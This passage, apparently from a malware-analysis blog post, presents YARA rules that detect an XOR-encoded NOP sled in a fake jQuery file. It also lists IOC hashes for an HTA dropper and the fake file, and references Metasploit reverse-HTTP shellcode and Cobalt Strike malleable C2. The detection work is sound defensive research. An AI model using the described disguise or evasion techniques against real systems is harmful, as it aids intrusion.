$b = "jquery.org/license" nocase
condition:
all of them
}
```

However since this data is built based on a template that means we can go a step further and look for the data itself that gets XOR decoded, these types of rules are interesting but can be easily bypassed since you're relying on pivot data and strict offsets in YARA.

```
rule xord_nopsled_in_jquery
{
strings:
$a = "return-1},P=\""
$b = "jquery.org/license" nocase
condition:
$b and for all i in (1..#a) : ((uint32(@a[i]+15+0x35) ^ uint32(@a[i]+15+0x35+8) == 0x90909090) and (uint32(@a[i]+15+0x35) ^ uint32(@a[i]+15+0x35+12) == 0x00000000))
}
```
Why the 0x0 after the DWORD of nops? Since it's two DWORD length of nops but we're not XORing the key with the decoded value it'll end up being 0x00000000 instead of 0x90909090. Maybe not entirely useful but it does show off how powerful YARA can be for signaturing on things at multiple levels.


IOCs:
```
6176941029763c6d91d408f3d63f1006de97eba45cb891b6a55f538d299b8a8c - HTA file
cba2820381969252a90caec4cb517cdafc9e01fd77aae7183e695211dc2756dd - Fake JQuery file
```





References:
1. https://www.hybrid-analysis.com/sample/6176941029763c6d91d408f3d63f1006de97eba45cb891b6a55f538d299b8a8c?environmentId=100
2. https://www.virustotal.com/#/intelligence-overview
3. https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_http.asm
4. http://threatexpress.com/2018/09/a-deep-dive-into-cobalt-strike-malleable-c2/
5. https://www.cobaltstrike.com/



[1]:https://www.hybrid-analysis.com/sample/6176941029763c6d91d408f3d63f1006de97eba45cb891b6a55f538d299b8a8c?environmentId=100
[2]:https://www.virustotal.com/#/intelligence-overview
[3]:https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_http.asm
[4]:http://threatexpress.com/2018/09/a-deep-dive-into-cobalt-strike-malleable-c2/
[5]:https://www.cobaltstrike.com/


